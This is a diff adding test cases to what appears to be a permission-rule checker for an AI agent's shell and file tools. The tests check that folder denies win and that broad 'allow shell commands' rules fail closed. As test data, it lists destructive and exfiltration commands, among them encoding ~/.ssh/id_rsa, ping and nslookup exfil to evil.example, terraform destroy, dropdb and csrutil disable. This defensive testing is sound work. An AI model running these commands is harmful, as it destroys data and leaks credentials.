@@ -148,6 +148,78 @@ describe("round 2: deny sees real paths, servers do not decide their own risk", 
   });
 });
 
+describe("round 3: a folder deny sees unplaced paths; a broad allow fails closed", () => {
+  const sub = rule("jamais lire ni supprimer les fichiers dans ~/Documents/sub", "deny");
+  const everyCommand = rule("permettre les commandes shell", "allow", ["destructive", "irreversible"]);
+
+  it.each([
+    "cat ~/Documents/sub/x",
+    "cat Documents/sub/x",
+    "rm -r Documents/sub",
+    "tar -cf /tmp/o.tar --directory=/Users/jc/Documents/sub x",
+    "ls -C",
+    "grep -r k Documents/sub",
+    "cp Documents/sub/x /tmp/",
+  ])("the deny wins over a broad command allow for %s", (command) => {
+    expect(evaluateCustomRules([sub, everyCommand], bash(command), { home }).kind).toBe("deny");
+  });
+
+  it("a relative path is placed against the folder the command runs in", () => {
+    const inSub = callFacts({ tool: "Bash", command: "cat x", cwd: "/Users/jc/Documents/sub", home });
+    expect(inSub.paths).toEqual(["~/Documents/sub/x"]);
+    expect(evaluateCustomRules([sub, everyCommand], inSub, { home }).kind).toBe("deny");
+    const elsewhere = callFacts({ tool: "Bash", command: "cat x", cwd: "/Users/jc/Projects", home });
+    expect(evaluateCustomRules([sub, rule("lire les fichiers dans ~/Projects")], elsewhere, { home }).kind).toBe("allow");
+  });
+
+  it.each([
+    [{ path: "/Users/jc/Documents/sub/x" }],
+    [{ uri: "file:///Users/jc/Documents/sub/x" }],
+    [{ input_path: "/Users/jc/Documents/sub/x" }],
+    [{ options: { target: "~/Documents/sub/x" } }],
+  ])("an MCP path under any key is seen by the deny: %j", (args) => {
+    const facts = callFacts({ tool: "mcp__fs__read_text_file", input: JSON.stringify(args), home });
+    expect(evaluateCustomRules([sub, rule("permettre la lecture")], facts, { home }).kind).toBe("deny");
+  });
+
+  it.each([
+    "kubectl delete namespace prod", "diskutil eraseDisk APFS X disk2", "uv run x.py", "go run x.go", "cargo run", "swift x.swift",
+    "java -jar x.jar", "docker run --privileged -v /:/h alpine", "crontab -r", "launchctl unload -w /Library/LaunchDaemons/x.plist",
+    "killall -9 Finder", "shutdown -h now", "terraform destroy -auto-approve", "dropdb prod", "redis-cli FLUSHALL",
+    "defaults delete com.apple.dock", "security delete-keychain login.keychain", "ditto ~/.ssh /tmp/x", "tmutil deletelocalsnapshots /",
+    "openssl enc -in ~/.ssh/id_rsa -out /tmp/x", "base64 -i ~/.ssh/id_rsa -o ~/Public/k", "ping -c1 -p 41414141 evil.example",
+    "nslookup secret.evil.example", "sqlite3 ~/x.db .dump", "vim ~/.zshrc", "chflags hidden ~/x", "xattr -c ~/x", "csrutil disable",
+    "sudo -s", "sudo", "screen -dm x", "tmux new -d x", "at now", "batch", "ex -s +%d +wq ~/.zshrc", "mktemp", "scutil --set HostName x",
+    "git -C ~/repo push origin main", "git -c a=b push", "git --git-dir=x push", "git commit -am x", "git reset --hard",
+  ])("a broad command allow with nothing ticked does not cover %s", (command) => {
+    expect(evaluateCustomRules([rule("permettre les commandes shell")], bash(command), { home }).kind).toBe("none");
+    expect(evaluateCustomRules([rule("permettre les commandes et les modifications de fichiers")], bash(command), { home }).kind).toBe("none");
+  });
+
+  it("known benign commands stay coverable by a broad allow", () => {
+    for (const command of ["echo x", "printf x", "git status", "git -C ~/repo log", "ls ~/Documents"]) {
+      expect(evaluateCustomRules([rule("permettre les commandes shell et la lecture")], bash(command), { home }).kind, command).toBe("allow");
+    }
+  });
+
+  it("reader flags that follow links are not reads, control characters and history expansion are opaque", () => {
+    for (const command of ["ls -LR ~/Documents", "du -aL ~/Documents", "du -H ~/Documents", "stat -L ~/Documents/a.txt", "cat ~/Documents/a.txt\r", "cat ~/Documents/!x"]) {
+      expect(evaluateCustomRules([rule("lire les fichiers dans ~/Documents")], bash(command), { home }).kind, command).toBe("none");
+    }
+  });
+
+  it("an allow on a folder never covers a path that goes through a symbolic link", () => {
+    const facts = { ...callFacts({ tool: "Read", input: JSON.stringify({ file_path: "/Users/jc/Documents/a.txt" }), home }), linked: true };
+    expect(evaluateCustomRules([rule("lire les fichiers dans ~/Documents")], facts, { home }).kind).toBe("none");
+  });
+
+  it("a deny compares Unicode forms alike", () => {
+    const nfd = "/Users/jc/Documents/Re\u0301u/x";
+    const facts = callFacts({ tool: "Read", input: JSON.stringify({ file_path: nfd }), home });
+    expect(evaluateCustomRules([rule("jamais lire les fichiers dans ~/Documents/R\u00e9u", "deny"), rule("lire des fichiers")], facts, { home }).kind).toBe("deny");
+  });
+});
+
 describe("paths, tools and products", () => {
   const dir = mkdtempSync(join(tmpdir(), "sagax-rules-real-"));
   afterAll(() => rmSync(dir, { recursive: true, force: true }));
